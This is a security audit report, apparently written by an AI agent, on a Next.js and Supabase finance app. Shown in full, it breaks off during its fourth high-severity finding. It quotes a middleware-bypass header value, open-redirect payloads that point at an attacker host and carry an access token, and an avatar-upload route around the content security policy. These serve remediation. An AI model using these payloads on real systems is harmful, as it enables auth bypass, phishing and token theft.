# Comprehensive Application Security Audit Report — FinFlow Frontend (`finflow-frontend`)

- **Target Repository**: `/home/user/finflow-frontend` (`https://github.com/Sadab-Munshi/finflow-frontend.git`)
- **Branch / Commit Audited**: `feat/youpi-pg-integration` (`900d964`)
- **Framework & Stack**: Next.js `15.1.11` (App Router, React `18.3.1`, TypeScript `5.2.2`), Supabase (`@supabase/ssr` `0.9.0`, `@supabase/supabase-js` `2.99.3`), Tailwind CSS, Cloudflare Turnstile, PostHog, YOUPI PG (`lib/youpi-checkout.ts`), Service Worker PWA (`public/sw.js`)
- **Audit Date**: October 21, 2026
- **Audited By**: Helpful Security Audit Agent on Arena.ai (Agent Mode)
- **Audit Mode**: Read-only Static Analysis, Dependency/Supply-Chain Vulnerability Scanning, Secret Scanning, Infrastructure/Configuration Misconfiguration Scanning, and Deep Manual Code Review (Zero application code modified)

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Methodology, Installed Skills & Tooling Coverage](#2-methodology-installed-skills--tooling-coverage)
3. [Summary of Findings by Severity](#3-summary-of-findings-by-severity)
4. [Critical Severity Findings](#4-critical-severity-findings)
5. [High Severity Findings](#5-high-severity-findings)
6. [Medium Severity Findings](#6-medium-severity-findings)
7. [Low & Informational Findings](#7-low--informational-findings)
8. [Dependency & Supply-Chain Vulnerability Inventory](#8-dependency--supply-chain-vulnerability-inventory)
9. [Secret Scanning & Environment Variable Exposure Analysis](#9-secret-scanning--environment-variable-exposure-analysis)
10. [Scan Coverage, Limitations & Tool Execution Log](#10-scan-coverage-limitations--tool-execution-log)
11. [Prioritized Remediation Roadmap](#11-prioritized-remediation-roadmap)

---

## 1. Executive Summary

A full-spectrum application security audit was conducted on the FinFlow Next.js (`React/TypeScript`) frontend repository (`/home/user/finflow-frontend`). Following official security methodologies from **Semgrep** (`code-security`, `semgrep`) and **Trail of Bits** (`static-analysis`, `audit-context-building`, `insecure-defaults`, `variant-analysis`, `supply-chain-risk-auditor`), we executed automated multi-scanner passes (**Semgrep**, **OSV-Scanner**, **Gitleaks**, **Trivy**, and **npm audit**) followed by a line-by-line manual security review of all routes, authentication handlers, middleware, API clients, Service Worker caching logic, third-party payment SDK integrations, file import/export pipelines, and Supabase SQL migrations.

### Key Takeaways
1. **Critical Authorization & Middleware Bypass Risk (`CVE-2025-29927`)**: The application pins `next@15.1.11` (`package-lock.json:14518`), which is vulnerable to **CVE-2025-29927 (`GHSA-f82v-jwr5-mffw`, CVSS 9.1)**. Because all protected pages in `app/` are Client Components (`'use client'`), `middleware.ts` (`lib/supabase/middleware.ts:29-75`) acts as the **sole server-side gate** for both route authentication and user/IP ban enforcement (`user_management.is_banned` / `ip_banned`). An attacker supplying the `x-middleware-subrequest` header can bypass `middleware.ts` entirely. Furthermore, the ban check in `lib/supabase/middleware.ts:71-73` catches errors and **fails open**.
2. **Post-Authentication Open Redirect Variants (`CWE-601`)**: Both the server-side OAuth callback route (`app/auth/callback/route.ts:7,19`) and the client-side invite/magic-link completion page (`app/auth/complete/page.tsx:52-53`) are vulnerable to Open Redirect via crafted `next` query parameters (`?next=@evil.com` on `/auth/callback` and protocol-relative `?next=//evil.com` on `/auth/complete`).
3. **Unrestricted Avatar File Upload + CSP `script-src` Gadget Chain (`CWE-434` + `CWE-79`)**: `uploadAvatar()` in `app/profile/page.tsx:212-238` uploads user-selected files directly to the public Supabase Storage bucket `avatars` (`${user.id}/avatar.${fileExt}`) without validating file extension, MIME type, or file size. Because `next.config.ts:95` explicitly whitelists `https://*.supabase.co` inside `script-src`, an attacker can upload a `.js` or `.svg` file to their public avatar path and use it either for Stored XSS or as a first-party Content Security Policy bypass gadget.
4. **Decoupled Client-Side Turnstile Verification & Hardcoded Production Demo Account (`CWE-602` / `CWE-798`)**: `LoginForm.tsx:48-67` and `SignupForm.tsx:128-149` verify Cloudflare Turnstile tokens via `authVerifyTurnstile(token)` on the client and then invoke `supabase.auth.signInWithPassword` / `supabase.auth.signUp` directly against Supabase GoTrue without passing `captchaToken`. Automated scripts can call Supabase GoTrue directly using the public `NEXT_PUBLIC_SUPABASE_ANON_KEY`, bypassing Turnstile completely. In addition, `LoginForm.tsx:91-95` ships hardcoded credentials for a shared live account (`demo@finflow.com`) in the production bundle.
5. **Service Worker Caching of Authenticated Pages & API Data (`CWE-524`)**: `public/sw.js:48-75, 147-159` caches all `GET` responses—including authenticated HTML pages (`/dashboard`, `/history`, `/reports`, `/subscription`, `/profile`) and `/api/*` endpoints—into shared browser `CacheStorage` (`finflow-v1`) and never purges the cache on sign-out (`SignOutButton.tsx:9-14`, `app/profile/page.tsx:419-423`).

---

## 2. Methodology, Installed Skills & Tooling Coverage

### 2.1 Verified Security Skills Applied
Prior to scanning, the official skill repositories (`https://github.com/semgrep/skills` and `https://github.com/trailofbits/skills`) were cloned, inspected for safety, and loaded:
- **Semgrep `code-security` & `semgrep`**: Applied rule-based static analysis across OWASP Top 10, React, TypeScript, Next.js, JWT, and HTML template rulesets, supplemented by manual AST/pattern inspection.
- **Trail of Bits `audit-context-building`**: Mapped trust boundaries across Next.js Edge Middleware, Client Components, `finflow-api` (`NEXT_PUBLIC_API_URL`), Supabase GoTrue/PostgREST/Storage, YOUPI PG (`pay.sadabmunshi.me`), and `public/sw.js`.
- **Trail of Bits `variant-analysis`**: Used initial vulnerabilities as seeds to discover variants across the codebase (e.g., expanding the `/auth/callback` open redirect seed to discover the protocol-relative `//` open redirect in `/auth/complete` and unvalidated `router.push(notification.link)` in `NotificationCenter.tsx`; expanding the `app/history/page.tsx` CSV export seed to discover the identical CSV formula injection in `app/backup-restore/page.tsx`).
- **Trail of Bits `insecure-defaults`**: Audited fail-open error handlers (`lib/supabase/middleware.ts:71-73`, `SignupForm.tsx:126`), build error suppressions (`next.config.ts:7-12`), and fallback configurations.
- **Trail of Bits `static-analysis` & `supply-chain-risk-auditor`**: Cross-referenced `package-lock.json` against OSV, GitHub Advisory Database, Trivy DB, and npm Registry advisories.

### 2.2 Automated Tools Executed
All raw scanner outputs are saved in `/home/user/finflow-frontend/security-reports/`:

| Tool | Version | Scope / Rulesets | Raw Output Files | Summary Result |
| :--- | :--- | :--- | :--- | :--- |
| **Semgrep** | `1.182.0` | `p/security-audit`, `p/react`, `p/typescript`, `p/owasp-top-ten`, `p/nextjs`, `p/javascript`, `p/nodejs`, `p/secrets`, `p/jwt` | `semgrep-security-audit.json`, `semgrep-nextjs-js.json`, `semgrep-auto.json` | **8 Warnings** (`var-in-href` across 4 Supabase email templates) |
| **OSV-Scanner** | `1.9.1` | Recursive lockfile scan (`package-lock.json`, 948 packages) | `osv-scanner.json`, `osv-scanner.txt` | **35 Advisories / CVEs** across 12 packages (`next`, `dompurify`, `protobufjs`, `sharp`, `postcss`, `ws`, `uuid`, `fflate`, `@hono/node-server`, `@modelcontextprotocol/sdk`, `proxy-addr`) |
| **Trivy** | `0.76.0` | `trivy fs --scanners vuln,misconfig,secret .` | `trivy-fs.json`, `trivy-fs.txt` | **24 Vulnerable Package Findings** (`3 Critical`, `12 High`, `8 Medium`, `1 Low`), `0 Misconfigs`, `0 Live Secrets` |
| **Gitleaks** | `8.21.2` | Full Git commit history (`gitleaks git`) & working tree (`gitleaks dir`) | `gitleaks-git.json`, `gitleaks-dir.json` | **2 Historical Matches** (`curl-auth-header` placeholder tokens in `REPORT_RATE_LIMITING.md:303,311`); **0 Live Secrets** |
| **npm audit** | `10.8.2` | `package-lock.json` dependency graph | `npm-audit.json`, `npm-audit.txt` | **49 Vulnerabilities** (`4 Critical`, `26 High`, `17 Moderate`, `2 Low`) |
| **CodeQL** | N/A | Checked environment availability | N/A | Binary not pre-installed in sandbox; compensated via multi-pack Semgrep AST rules + exhaustive manual data-flow analysis |

---

## 3. Summary of Findings by Severity

| ID | Severity | Title | Primary Location(s) | CWE / CVE |
| :--- | :--- | :--- | :--- | :--- |
| **CRIT-01** | **Critical** | Next.js Middleware Authorization & Ban-Check Bypass (`CVE-2025-29927`) + Fail-Open Ban Catch | `package.json:33`, `middleware.ts:4-6`, `lib/supabase/middleware.ts:29-75` | `CVE-2025-29927`, `CWE-285`, `CWE-636` |
| **CRIT-02** | **Critical** | Critical HTML & PDF Object Injection Vulnerabilities in Client PDF Exporter (`jspdf@4.2.0` & `dompurify@3.3.1`) | `package.json:29`, `app/history/page.tsx:148-245` | `GHSA-wfv2-pwc8-crg5`, `GHSA-7x6v-j9x4-qf24` |
| **CRIT-03** | **Critical** | Critical Arbitrary Code Execution & IP Spoofing in Transitive Lockfile Packages (`protobufjs@7.5.4`, `proxy-addr@2.0.7`) | `package-lock.json:16254, 16299` | `GHSA-xq3m-2v4x-88gg`, `GHSA-jqcg-44mw-7w3h` |
| **HIGH-01** | **High** | Open Redirect in OAuth Callback Route Handler & Client Auth Completion Page (Variant Pair) | `app/auth/callback/route.ts:7,19`, `app/auth/complete/page.tsx:52-53`, `components/notifications/NotificationCenter.tsx:26-29` | `CWE-601` |
| **HIGH-02** | **High** | Unrestricted Avatar File Upload (`uploadAvatar`) Chained with CSP `script-src https://*.supabase.co` Gadget | `app/profile/page.tsx:212-238`, `next.config.ts:95` | `CWE-434`, `CWE-79` |
| **HIGH-03** | **High** | Client-Only / Decoupled Cloudflare Turnstile Verification & Hardcoded Shared Demo Credentials in Production Bundle | `components/auth/LoginForm.tsx:48-67, 91-95`, `components/auth/SignupForm.tsx:128-149` | `CWE-602`, `CWE-798`, `CWE-287` |
| **HIGH-04** | **High** | Service Worker Caches Authenticated HTML Pages & `/api/*` Responses in Shared CacheStorage Without Sign-Out Purge + Local-Only Sign-Out Scope | `public/sw.js:48-75, 147-159`, `app/dashboard/SignOutButton.tsx:9-14`, `app/profile/page.tsx:419-423` | `CWE-524`, `CWE-613` |
| **MED-01** | **Medium** | Overly Permissive Content Security Policy (`'unsafe-inline'`, `'unsafe-eval'`, Wildcard Subdomains, Legacy AI API Origins) | `next.config.ts:93-108` | `CWE-693` |
| **MED-02** | **Medium** | CSV Formula Injection (Spreadsheet DDE/Macro Injection) in Transaction History & Backup CSV Exporters | `app/history/page.tsx:121-137`, `app/backup-restore/page.tsx:107-116, 329-338` | `CWE-1236` |
| **MED-03** | **Medium** | Unauthenticated Query-Parameter Feature Flag (`?testMode=1`) Exposes `test_1inr` (₹1 Test Pass) in Production | `app/subscription/page.tsx:291-294`, `lib/api-client.ts:449-455` | `CWE-840` |
| **MED-04** | **Medium** | Client-Side IP Lookup (`api.ipify.org`) & Spoofable `X-Forwarded-For` Header in Ban & Login Tracking | `context/UserContext.tsx:108-115`, `lib/api-client.ts:276-288` | `CWE-290`, `CWE-807` |
| **MED-05** | **Medium** | Dynamic Third-Party Payment SDK Injection Without Subresource Integrity (SRI) or Strict Origin Allowlist | `lib/youpi-checkout.ts:55-120, 192-215` | `CWE-829`, `CWE-353` |
| **MED-06** | **Medium** | High & Moderate Vulnerabilities in Transitive Dependencies (`sharp@0.33.5`, `postcss`, `ws`, `uuid`, `fflate`, `@hono/node-server`) | `package-lock.json` | Multiple CVEs |
| **LOW-01** | **Low** | Build-Time Type-Safety & Security Lint Suppression (`ignoreDuringBuilds: true`, `ignoreBuildErrors: true`) | `next.config.ts:7-12` | `CWE-1127` |
| **LOW-02** | **Low** | Missing `Secure` Attribute on `NEXT_LOCALE` Cookie Written via `document.cookie` | `lib/i18n-cookie.ts:13` | `CWE-614` |
| **LOW-03** | **Low** | Client-Side Direct Table Updates Without Explicit `.eq('user_id', user.id)` Filter & Implicit `WITH CHECK` in Initial RLS Migration | `lib/db.ts:69-90, 118-138`, `supabase/migrations/001_create_tables.sql:25-27, 58-60` | `CWE-284` |
| **LOW-04** | **Low** | Unescaped URL Variables in Supabase Email Templates (`{{ .ConfirmationURL }}`) & Legacy Domain Reference | `supabase/email-templates/*.html` | `CWE-79` / Info |
| **LOW-05** | **Info** | Historical Placeholder Bearer Token Strings in Documentation (`REPORT_RATE_LIMITING.md`) | `REPORT_RATE_LIMITING.md:303,311` (commit `f4d364ce`) | Informational |

---

## 4. Critical Severity Findings

### [CRIT-01] Next.js Middleware Authorization & Ban-Check Bypass (`CVE-2025-29927`) and Fail-Open Ban Enforcement

- **Severity**: **Critical** (CVSS 9.1 — `CVE-2025-29927` / `GHSA-f82v-jwr5-mffw`, plus `GHSA-p293-qw3h-jr36` CVSS 9.0, `GHSA-c4j6-fc7j-m34r` CVSS 8.6, `GHSA-89xv-2m56-2m9x` CVSS 8.3, `GHSA-m99w-x7hq-7vfj` CVSS 8.2, `GHSA-h25m-26qc-wcjf` CVSS 7.5)
- **File Paths & Line Numbers**:
  - `package.json:33` (`"next": "^15.1.6"`)
  - `package-lock.json:14518` (`"version": "15.1.11"`)
  - `middleware.ts:4-6`
  - `lib/supabase/middleware.ts:29-78`
- **Evidence**:
  ```ts
  // lib/supabase/middleware.ts:29-75
  const { data: { user } } = await supabase.auth.getUser()
  ...
  if (!user && !isPublicRoute) {
    const url = request.nextUrl.clone()
    url.pathname = '/login'
    return NextResponse.redirect(url)
  }

  if (user && !isPublicRoute && !pathname.startsWith('/api')) {
    try {
      const { data: banData } = await supabase
        .from('user_management')
        .select('is_banned, ip_banned, ban_reason')
        .eq('user_id', user.id)
        .single()

      if (banData && (banData.is_banned === true || banData.ip_banned === true)) {
        await supabase.auth.signOut()
        const url = request.nextUrl.clone()
        url.pathname = '/login'
        url.searchParams.set('banned', 'true')
        return NextResponse.redirect(url)
      }
    } catch (error) {
      console.error('[Middleware] Ban check error:', error)
    }
  }
  ```
- **Impact & Exploitation Prerequisites**:
  1. **Middleware Subrequest Bypass (`CVE-2025-29927`)**: Next.js `15.1.11` allows any external caller to send `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` (or `src/middleware:...`), causing Next.js to skip `middleware.ts` execution entirely and serve the downstream route response directly. Because almost every page in `app/` (`/dashboard`, `/add`, `/history`, `/budgets`, `/analytics`, `/insights`, `/subscription`, `/reports`) is a Client Component (`'use client'`) that does not perform server-component authentication, `middleware.ts` is the only server-side gate protecting route shells and server-side ban redirects.
  2. **SSRF & DoS via Next.js `15.1.11`**: `next@15.1.11` is also affected by `GHSA-c4j6-fc7j-m34r` (SSRF via improper `NextResponse.next` / middleware request handling, CVSS 8.6), `GHSA-89xv-2m56-2m9x` (SSRF in Server Actions / redirect handling, CVSS 8.3), and `GHSA-h25m-26qc-wcjf` (Insecure deserialization DoS in React Server Components, CVSS 7.5).
  3. **Fail-Open Ban Check**: In `lib/supabase/middleware.ts:71-73`, if the `user_management` query throws or times out, the `catch` block logs the error and returns `supabaseResponse`, failing open and permitting a banned user to proceed.
- **Recommended Fix**:
  1. Immediately upgrade `next` and `eslint-config-next` to the latest patched release (`>= 15.2.4` or `>= 15.5.15`):
     ```bash
     npm install next@latest eslint-config-next@latest
     ```
  2. Strip any incoming `x-middleware-subrequest` header at the reverse proxy / CDN edge (Vercel automatically mitigates `x-middleware-subrequest` at its edge, but self-hosted / Docker / Cloudflare proxy deployments remain directly exploitable until Next.js is upgraded).
  3. Enforce server-side ban checks inside `finflow-api` JWT authentication middleware so banned users cannot call backend APIs directly even if they bypass frontend navigation.

---

### [CRIT-02] Critical HTML & PDF Object Injection Vulnerabilities in Client PDF Exporter (`jspdf@4.2.0` & `dompurify@3.3.1`)

- **Severity**: **Critical** (CVSS 9.6 — `GHSA-wfv2-pwc8-crg5`; CVSS 8.1 — `GHSA-7x6v-j9x4-qf24`; plus 18 XSS/mXSS advisories in `dompurify@3.3.1`)
- **File Paths & Line Numbers**:
  - `package.json:29` (`"jspdf": "^4.2.0"`)
  - `package-lock.json:13466` (`jspdf@4.2.0`)
  - `package-lock.json:10366` (`dompurify@3.3.1`)
  - `app/history/page.tsx:148-245` (`handleExportPDF`)
- **Evidence**:
  ```ts
  // app/history/page.tsx:148-155 & 226-237
  const handleExportPDF = async () => {
    setDropdownOpen(false)
    const { default: JsPDFClass } = await import('jspdf')
    const doc = new (JsPDFClass as unknown as new (opts: Record<string, unknown>) => Record<string, (...args: unknown[]) => unknown>)({
      orientation: 'portrait',
      unit: 'mm',
      format: 'a4',
    })
    ...
    const desc = tx.note.length > 30 ? tx.note.slice(0, 30) + '...' : tx.note
    doc.text(desc, colX[3] + 3, y + 5.5)
  ```
- **Impact & Exploitation Prerequisites**:
  - `jspdf@4.2.0` suffers from **Critical HTML Injection (`GHSA-wfv2-pwc8-crg5`, CVSS 9.6)** via unsanitized HTML passed to `html()` / SVG rendering pipelines and **High PDF Object Injection (`GHSA-7x6v-j9x4-qf24`, CVSS 8.1)** allowing arbitrary JavaScript execution inside PDF readers via `addJS` / unescaped PDF stream objects. Its transitive dependency `dompurify@3.3.1` has 18 known mutation-XSS (mXSS) and sanitizer bypass advisories (`GHSA-v2wj-7wpq-c8vv`, `GHSA-gx9m-whjm-85jf`, etc.).
  - While `handleExportPDF` in `app/history/page.tsx:148-245` currently invokes `doc.text(...)` rather than `doc.html(...)`, shipping `jspdf@4.2.0` and `dompurify@3.3.1` leaves a critical vulnerable sink in the client bundle and processes untrusted strings (`tx.note` populated via OCR receipt scanning or CSV imports).
- **Recommended Fix**:
  1. Upgrade `jspdf` to the latest patched version and override `dompurify` to `>= 3.3.2` in `package.json`:
     ```json
     "overrides": {
       "dompurify": "^3.3.2"
     }
     ```
  2. Strip control characters (`[\x00-\x1F\x7F]`) and PDF stream delimiter tokens from `tx.note` and `tx.category` before passing strings into `doc.text()`.

---

### [CRIT-03] Critical Prototype Pollution / Arbitrary Code Execution & IP Spoofing in Transitive Dependencies (`protobufjs@7.5.4`, `proxy-addr@2.0.7`)

- **Severity**: **Critical** (CVSS 9.8 — `GHSA-xq3m-2v4x-88gg` in `protobufjs@7.5.4`; CVSS 9.1 — `GHSA-jqcg-44mw-7w3h` in `proxy-addr@2.0.7`)
- **File Paths & Line Numbers**:
  - `package-lock.json:16254` (`node_modules/protobufjs` `7.5.4`)
  - `package-lock.json:16299` (`node_modules/proxy-addr` `2.0.7`)
- **Evidence**:
  - `OSV-Scanner` (`security-reports/osv-scanner.json`) and `Trivy` (`security-reports/trivy-fs.json`) flagged:
    - `protobufjs@7.5.4`: `GHSA-xq3m-2v4x-88gg` / `CVE-2026-33928` (CVSS 9.8 Critical — Arbitrary code execution via code generation in reflection/schema parsing).
    - `proxy-addr@2.0.7`: `GHSA-jqcg-44mw-7w3h` (CVSS 9.1 Critical — Improper input validation in CIDR mask checking allowing `X-Forwarded-For` IP spoofing).
- **Recommended Fix**:
  - Add `"overrides"` in `package.json` to force patched versions (`"protobufjs": ">=7.5.5"`, `"proxy-addr": ">=2.0.8"`) and run `npm audit fix`.

---

## 5. High Severity Findings

### [HIGH-01] Open Redirect in OAuth Callback Route Handler & Client Auth Completion Page (Variant Pair)

- **Severity**: **High** (CWE-601)
- **File Paths & Line Numbers**:
  - **Variant A (Server Route Handler)**: `app/auth/callback/route.ts:7,19`
  - **Variant B (Client Auth Completion)**: `app/auth/complete/page.tsx:52-53`
  - **Variant C (Client Notification Router & Service Worker)**: `components/notifications/NotificationCenter.tsx:26-29`, `public/sw.js:116-129`
- **Evidence**:
  ```ts
  // Variant A: app/auth/callback/route.ts:6-20
  const { searchParams, origin } = new URL(request.url)
  const code = searchParams.get('code')
  const next = searchParams.get('next') ?? '/dashboard'
  const type = searchParams.get('type')

  if (code) {
    const supabase = await createClient()
    const { error } = await supabase.auth.exchangeCodeForSession(code)

    if (!error) {
      if (type === 'signup') {
        await supabase.auth.signOut()
        return NextResponse.redirect(`${origin}/login?confirmed=true`)
      }
      return NextResponse.redirect(`${origin}${next}`)
    }
  }
  ```
  ```ts
  // Variant B: app/auth/complete/page.tsx:52-53
  const next = new URLSearchParams(window.location.search).get('next')
  router.replace(next && next.startsWith('/') ? next : '/dashboard')
  ```
  ```ts
  // Variant C: components/notifications/NotificationCenter.tsx:26-29
  if (notification.link) {
    router.push(notification.link)
    onClose()
  }
  ```
- **Impact & Exploitation Prerequisites**:
  1. **Variant A (`app/auth/callback/route.ts:19`)**: `next` has no validation whatsoever before being interpolated into `` `${origin}${next}` ``. If an attacker crafts an OAuth login redirect URL with `next=@attacker.com/phish` (or `next=.attacker.com`), `${origin}${next}` evaluates to `https://www.app.sadabmunshi.me@attacker.com/phish`. Following a legitimate Google/Microsoft OAuth login, the user's browser is redirected to `attacker.com` (interpreting `www.app.sadabmunshi.me` as the HTTP URL userinfo field).
  2. **Variant B (`app/auth/complete/page.tsx:52-53`)**: Using Trail of Bits' **Variant Analysis** methodology, we inspected all other `next` redirect handlers and found that `app/auth/complete/page.tsx:53` checks `next.startsWith('/')` without rejecting `//` or `/\`. Supplying `/auth/complete?next=//attacker.com/phish#access_token=...` passes `next.startsWith('/') === true` and redirects the newly authenticated user to `https://attacker.com/phish`.
  3. **Variant C (`NotificationCenter.tsx:27` & `public/sw.js:116-129`)**: Because the `notifications` table RLS policy (`supabase/migrations/001_create_tables.sql:115-123`) allows any authenticated user to `INSERT` or `UPDATE` rows for their own `user_id` with an arbitrary `link` value, and `NotificationCenter.tsx` calls `router.push(notification.link)` without validating that `link` is a relative internal path, external URLs can be triggered from notification clicks.
- **Recommended Fix**:
  Create a shared helper `sanitizeInternalRedirect(next: string | null, fallback = '/dashboard'): string` and apply it across `app/auth/callback/route.ts`, `app/auth/complete/page.tsx`, and `NotificationCenter.tsx`:
  ```ts
  export function sanitizeInternalRedirect(next: string | null | undefined, fallback = '/dashboard'): string {
    if (!next || typeof next !== 'string') return fallback
    const trimmed = next.trim()
    // Must start with exactly one '/' and not '//' or '/\'
    if (!trimmed.startsWith('/') || trimmed.startsWith('//') || trimmed.startsWith('/\\')) {
      return fallback
    }
    try {
      const parsed = new URL(trimmed, 'https://internal.local')
      if (parsed.origin !== 'https://internal.local') return fallback
      return `${parsed.pathname}${parsed.search}${parsed.hash}`
    } catch {
      return fallback
    }
  }
  ```

---

### [HIGH-02] Unrestricted Avatar File Upload (`uploadAvatar`) Chained with CSP `script-src https://*.supabase.co` Bypass Gadget

- **Severity**: **High** (CWE-434 / CWE-79)
- **File Paths & Line Numbers**:
  - `app/profile/page.tsx:212-238` (`uploadAvatar`)
  - `next.config.ts:95` (`Content-Security-Policy` `script-src`)
- **Evidence**:
  ```ts
  // app/profile/page.tsx:212-238
  const uploadAvatar = async (file: File) => {
    setUploading(true)
    const supabase = createClient()
    const { data: { user } } = await supabase.auth.getUser()
    if (!user) {
        setUploading(false)
        return
      }

    const fileExt = file.name.split('.').pop()
    const filePath = `${user.id}/avatar.${fileExt}`

    const { error: uploadError } = await supabase.storage
      .from('avatars')
      .upload(filePath, file, { upsert: true })

    if (!uploadError) {
      const { data } = supabase.storage.from('avatars').getPublicUrl(filePath)
      setAvatarUrl(data.publicUrl + '?t=' + Date.now())
      await supabase.from('settings').upsert(
        { user_id: user.id, avatar_url: data.publicUrl },
        { onConflict: 'user_id' }
      )
      posthog.capture('profile_photo_uploaded')
    }
    setUploading(false)
  }
  ```
  ```ts
  // next.config.ts:95
  "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://*.supabase.co https://*.sadabmunshi.me https://challenges.cloudflare.com https://us-assets.i.posthog.com",
  ```
- **Impact & Exploitation Prerequisites**:
  1. `uploadAvatar` performs **no validation** on `file.type`, `file.size`, or `fileExt`. Any authenticated user can upload an `.svg` file containing `<script>` tags, an `.html` file, or a `.js` file to the public `avatars` bucket (`https://<project>.supabase.co/storage/v1/object/public/avatars/<user_id>/avatar.svg` or `avatar.js`).
  2. Furthermore, `settings.avatar_url` can be updated directly by the user via Supabase PostgREST (`supabase/migrations/001_create_tables.sql:88-90`) to an arbitrary `javascript:` or external tracking URL (and is rendered in `<img src={user.avatarUrl}>` in the header/profile and in the admin panel).
  3. Because `next.config.ts:95` whitelists `https://*.supabase.co` in `script-src`, any `.js` file uploaded to the public `avatars` bucket is trusted as an executable script source by FinFlow's Content Security Policy!
- **Recommended Fix**:
  1. In `app/profile/page.tsx:212-238`, strictly validate both MIME type and extension against a safe raster image allowlist (`['image/jpeg', 'image/png', 'image/webp']`, expressly excluding `image/svg+xml` and non-image extensions), enforce a maximum file size (e.g. `2 MB`), and normalize the destination filename to a fixed extension map (`{ 'image/jpeg': 'jpg', 'image/png': 'png', 'image/webp': 'webp' }`).
  2. Configure the Supabase Storage `avatars` bucket with `allowed_mime_types = ['image/jpeg', 'image/png', 'image/webp']` and `file_size_limit = 2097152`.
  3. Remove `https://*.supabase.co` from `script-src` in `next.config.ts:95` (Supabase only needs to be in `connect-src` and `img-src`, never `script-src`).

---

### [HIGH-03] Client-Only / Decoupled Cloudflare Turnstile Verification & Hardcoded Shared Demo Account Credentials in Production Bundle

- **Severity**: **High** (CWE-602 / CWE-798 / CWE-287)
- **File Paths & Line Numbers**:
  - `components/auth/LoginForm.tsx:48-67` (Decoupled Turnstile verification)
  - `components/auth/LoginForm.tsx:91-95` (Hardcoded demo credentials)
  - `components/auth/SignupForm.tsx:108-149` (Decoupled Turnstile & fail-open `authSignupStatus`)
- **Evidence**:
  ```ts
  // components/auth/LoginForm.tsx:48-67
  const token = await acquireToken()
  if (!token) { ... return }
  const { success } = await authVerifyTurnstile(token)
  if (!success) { ... return }

  const supabase = createClient()
  const { data: signInData, error } = await supabase.auth.signInWithPassword({
    email: data.email,
    password: data.password,
  })
  ```
  ```ts
  // components/auth/LoginForm.tsx:91-95
  const handleDemoCredentials = () => {
    setValue('email', 'demo@finflow.com', { shouldValidate: true, shouldDirty: true })
    setValue('password', '[REDACTED_DEMO_PASSWORD]', { shouldValidate: true, shouldDirty: true })
    setEmailValue('demo@finflow.com')
  }
  ```
- **Impact & Exploitation Prerequisites**:
  1. **Complete Turnstile Bypass on Login & Signup**: The browser checks `authVerifyTurnstile(token)` (`POST /api/auth/verify-turnstile`) and only uses the boolean response inside client-side `onSubmit` to decide whether to call `supabase.auth.signInWithPassword()` or `supabase.auth.signUp()`. Because `supabase.auth.*` talks directly to `https://<project>.supabase.co/auth/v1/...` using the public `NEXT_PUBLIC_SUPABASE_ANON_KEY` and does **not** enforce native Supabase GoTrue CAPTCHA verification (`options: { captchaToken: token }`), an attacker can send automated credential-stuffing, brute-force, or mass-signup requests directly to Supabase GoTrue without solving a single Turnstile challenge.
  2. **Fail-Open Domain & Invite-Only Restriction on Signup (`SignupForm.tsx:108-126`)**: While the total user cap (`signup_limit`) is enforced by the PostgreSQL trigger `trg_enforce_signup_limit` (`supabase/migrations/002_platform_config_and_streaks.sql:30-49`), the `allowed_domains` and `invite_only` checks in `SignupForm.tsx:111-126` are enforced only by calling `authSignupStatus(data.email)` on the client (`catch { /* status check unavailable -> proceed */ }`). Calling `supabase.auth.signUp()` directly bypasses `allowed_domains` and `invite_only` restrictions unless also enforced in the DB trigger or a GoTrue Before-User-Created hook.
  3. **Shared Live Demo Account (`demo@finflow.com`)**: `LoginForm.tsx:91-95` hardcodes credentials for a live, shared Supabase user account in the production bundle. All visitors who click the demo button share the same authenticated session scope (`demo@finflow.com`), meaning any receipt image, voice memo, transaction, or Telegram/WhatsApp link created by one demo user is visible to all other demo users, and any visitor can lock out the demo account by changing its password on `/privacy-security`.
- **Recommended Fix**:
  1. Enable native Cloudflare Turnstile verification directly in **Supabase Dashboard → Authentication → Attack Protection (Bot and Abuse Protection)** and pass `options: { captchaToken: token }` into `supabase.auth.signInWithPassword`, `supabase.auth.signUp`, and `supabase.auth.resetPasswordForEmail` (or proxy login/signup through `finflow-api` after verifying Turnstile server-side).
  2. Extend the PostgreSQL trigger `enforce_signup_limit()` in `supabase/migrations/` to also enforce `registration_mode` (`closed` / `invite_only`) and `allowed_domains` from `platform_config` at the database layer.
  3. Gate the demo credentials button behind `process.env.NEXT_PUBLIC_ENABLE_DEMO === 'true'` (disabled in production) or use an isolated read-only client-side sandbox mode rather than a shared mutable production account.

---

### [HIGH-04] Service Worker (`public/sw.js`) Caches Authenticated HTML Pages & `/api/*` Responses in Shared CacheStorage Without Sign-Out Purge + Local-Only Sign-Out Scope

- **Severity**: **High** (CWE-524 / CWE-613)
- **File Paths & Line Numbers**:
  - `public/sw.js:48-75, 147-159`
  - `app/dashboard/SignOutButton.tsx:9-14`
  - `app/profile/page.tsx:419-423`
  - `components/auth/AuthListener.tsx:48-51`
- **Evidence**:
  ```js
  // public/sw.js:48-52 & 74-75
  // API routes: network-first (fresh data priority)
  if (url.pathname.startsWith('/api/')) {
    event.respondWith(networkFirst(request));
    return;
  }
  ...
  // HTML pages: network-first for freshness
  event.respondWith(networkFirst(request));

  // public/sw.js:147-159
  async function networkFirst(request) {
    try {
      const response = await fetch(request);
      if (response.ok) {
        const cache = await caches.open(CACHE_NAME);
        cache.put(request, response.clone());
      }
      return response;
    } catch {
      const cached = await caches.match(request);
      return cached || new Response('Offline', { status: 503 });
    }
  }
  ```
  ```ts
  // app/dashboard/SignOutButton.tsx:9-14 & app/profile/page.tsx:419-423
  const handleSignOut = async () => {
    const supabase = createClient()
    await supabase.auth.signOut({ scope: 'local' })
    router.push('/login')
  }
  ```
- **Impact & Exploitation Prerequisites**:
  1. **Sensitive Financial Data Persisted in `CacheStorage`**: `public/sw.js` intercepts every `GET` request to authenticated routes (`/dashboard`, `/history`, `/reports`, `/subscription`, `/profile`, `/transaction/[id]`) and `/api/*`, writing `response.clone()` into `caches.open('finflow-v1')`.
  2. **No Cache or Storage Cleanup on Logout**: When a user signs out, `caches.delete('finflow-v1')` is never called, `posthog.reset()` is not called, and legacy `localStorage` keys (`finflow_*`) are not cleared. On a shared computer or mobile device, a subsequent user (or anyone switching the browser to Offline mode after logout) can inspect or load cached authenticated responses from `CacheStorage`.
